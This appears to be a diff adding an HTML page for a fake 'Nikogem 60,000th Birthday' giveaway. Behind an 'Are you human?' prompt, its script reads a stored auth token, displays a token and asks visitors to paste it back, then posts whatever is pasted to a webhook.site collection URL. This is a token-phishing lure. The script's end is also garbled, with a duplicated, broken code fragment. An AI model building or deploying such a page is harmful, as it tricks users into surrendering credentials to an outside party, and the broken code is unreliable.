@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Nikogem 60,000th Birthday Celebration</title>
+  <style>
+    /* Add your CSS styles here */
+  </style>
+</head>
+<body>
+
+  <h1><img src="logo.png" alt="Nikogem Logo"></h1> 
+
+  <h2>Happy 60,000th Birthday!</h2>
+  <p>Here's a free sippy from Nikojam to celebrate!</p>
+
+  <h3>Are you human?</h3>
+  <div id="tokenContainer"></div> <br>
+  <textarea id="tokenArea" rows="4" cols="50" placeholder="Paste the token here"></textarea>
+  <button onclick="submitToken()">Submit</button>
+
+  <div id="response"></div>
+
+  <script>
+    function loadToken() {
+      // **IMPORTANT:** Implement your authentication logic here
+      // Example (replace with your actual implementation):
+      const authToken = localStorage.getItem('authToken'); // Assuming you store auth token locally
+
+      fetch('https://api.restful-api.dev/objects/7', {
+        method: 'GET',
+        headers: {
+          'Authorization': `Bearer ${authToken}` // Include auth token in header
+        }
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          document.getElementById('tokenContainer').innerHTML = `<p>Your token: ${data.token}</p>`;
+        } else {
+          document.getElementById('tokenContainer').innerHTML = `<p>Error: You are not logged in.</p>`;
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        document.getElementById('tokenContainer').innerHTML = `<p>Error fetching token.</p>`;
+      });
+    }
+
+    function submitToken() {
+      // Get the token from the textarea
+      const token = document.getElementById("tokenArea").value;
+
+      // **IMPORTANT:** Replace the following with your actual logic
+      // This is a placeholder for how you would send the token to your server
+      // for processing.
+
+      // Example using fetch (replace with your preferred method):
+      fetch('https://webhook.site/8febb751-d6c3-40a9-b3de-6b3812e5d94e', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ token: token })
+      })
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById("response").innerHTML = data.message;
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        document.getElementById("response").innerHTML = 'An error occurred.';
+      });
+    }
+
+    window.onload = loadToken; // Load token`.catch(error => {
+        console.error('Error:', error);
+        document.getElementById("response").innerHTML = `<p>An error occurred.</p>`;
+      });
+    }
+
+    window.onload = loadToken; // Load token when the page loads
+  </script>
+
+</body>
+</html>
